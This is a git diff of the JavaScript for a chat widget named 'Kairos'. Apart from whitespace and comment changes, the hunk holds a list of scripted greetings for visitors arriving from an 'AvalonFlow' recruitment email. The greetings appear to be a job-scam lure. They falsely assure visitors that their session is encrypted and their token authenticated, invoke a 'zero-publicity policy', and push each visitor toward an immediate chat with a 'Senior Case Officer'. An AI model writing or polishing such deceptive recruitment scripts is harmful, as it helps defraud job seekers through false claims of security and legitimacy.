@@ -2192,17 +2192,17 @@ function initiateKairosConversation() {
         setTimeout(() => {
             removeTyping();
             personality.awaitingSarahConfirm = true;
-            ‎
-‎const greetings = [
-‎    "Welcome! 👋 Kairos online. I see you're checking in from our AvalonFlow Corporate Treasury dispatch. Ready to transition your instructional design skills into fintech? I can alert Sarah [Senior Case Officer], right now to initiate your application live. Should I do that?",
-‎    "Hi there! ⚡ Kairos automated assistant active. Your token from the education-to-fintech campaign is verified. Whether you are leaning towards the Technical Writer or Platform Trainer role, I can patch you straight through to Sarah's [Senior Case Officer] desk to begin your interview. Do you want that?",
-‎    "Hello! Welcome to your secure application portal. 🔒 In line with AvalonFlow’s zero-publicity policy, this session is fully encrypted.  Should I immediately notify Sarah [Senior Case Officer] that you've arrived?",
-‎    "Hi there! 👋 Kairos system initialized. Your early-learner scaffolding experience makes you a perfect fit for our structural organization needs. Would you like me to instantly notify Sarah [Senior Case Officer] that you've arrived?",
-‎    "Welcome! ⚡ Kairos automated assistant online. Your unique reference ID (AF-5019) has been successfully authenticated. Let’s get your application initialized, I can patch you straight through to Sarah's [Senior Case Officer] desk right now. Ready to Begin?",
-‎    "Welcome to your secure workspace! Kairos assistant active. In accordance with our strict zero-publicity policy, your session data is fully isolated.  Should I alert Sarah, the Senior Case Officer to join the chat right now?",
-‎    "Hi! Kairos online. ⚡ We received your secure click-through for the Corporate Operations opening. If you don't have your application instructions ready, I can immediately ping Sarah's [Senior Case Officer] desk right now. Do you want that?",
-‎    "Welcome! 😊 Kairos here. We received your secure click-through from the AvalonFlow recruitment email. Let's get your interview initialized—would you like me to transfer you directly over to Sarah [Senior Case Officer] right now?"
-‎];
+
+            const greetings = [
+                "Welcome! 👋 Kairos online. I see you're checking in from our AvalonFlow Corporate Treasury dispatch. Ready to transition your instructional design skills into fintech? I can alert Sarah [Senior Case Officer], right now to initiate your application live. Should I do that?",
+                "Hi there! ⚡ Kairos automated assistant active. Your token from the education-to-fintech campaign is verified. Whether you are leaning towards the Technical Writer or Platform Trainer role, I can patch you straight through to Sarah's [Senior Case Officer] desk to begin your interview. Do you want that?",
+                "Hello! Welcome to your secure application portal. 🔒 In line with AvalonFlow’s zero-publicity policy, this session is fully encrypted.  Should I immediately notify Sarah [Senior Case Officer] that you've arrived?",
+                "Hi there! 👋 Kairos system initialized. Your early-learner scaffolding experience makes you a perfect fit for our structural organization needs. Would you like me to instantly notify Sarah [Senior Case Officer] that you've arrived?",
+                "Welcome! ⚡ Kairos automated assistant online. Your unique reference ID (AF-5019) has been successfully authenticated. Let’s get your application initialized, I can patch you straight through to Sarah's [Senior Case Officer] desk right now. Ready to Begin?",
+                "Welcome to your secure workspace! Kairos assistant active. In accordance with our strict zero-publicity policy, your session data is fully isolated.  Should I alert Sarah, the Senior Case Officer to join the chat right now?",
+                "Hi! Kairos online. ⚡ We received your secure click-through for the Corporate Operations opening. If you don't have your application instructions ready, I can immediately ping Sarah's [Senior Case Officer] desk right now. Do you want that?",
+                "Welcome! 😊 Kairos here. We received your secure click-through from the AvalonFlow recruitment email. Let's get your interview initialized—would you like me to transfer you directly over to Sarah [Senior Case Officer] right now?"
+            ];
             const randomGreeting = greetings[Math.floor(Math.random() * greetings.length)];
             addMessage(randomGreeting, "bot", "delivered", "text", "kairos");
 
@@ -2228,11 +2228,11 @@ function initiateKairosConversation() {
             isSarahActive = false;
             personality.awaitingTimeoutRetry = true;
             localStorage.removeItem('sarah_takeover_timestamp');
-            
+
             const botHeader = document.getElementById('botHeader');
             if (botHeader) {
                 botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
-                botHeader.textContent = KAIROS_TITLE; // Fixed alignment
+                botHeader.textContent = KAIROS_TITLE; 
             }
             startQuoteAutorotation();
         } else if (lastSarahIndex > -1 && lastSarahIndex > lastEndIndex) {
@@ -2248,12 +2248,13 @@ function initiateKairosConversation() {
             const botHeader = document.getElementById('botHeader');
             if (botHeader) {
                 botHeader.style.background = "linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9))";
-                botHeader.textContent = KAIROS_TITLE; // Fixed alignment
+                botHeader.textContent = KAIROS_TITLE; 
             }
             startQuoteAutorotation();
         }
     }
 }
+
 
 function loadChatHistory() {
     if (chatHistory.length > 0) {
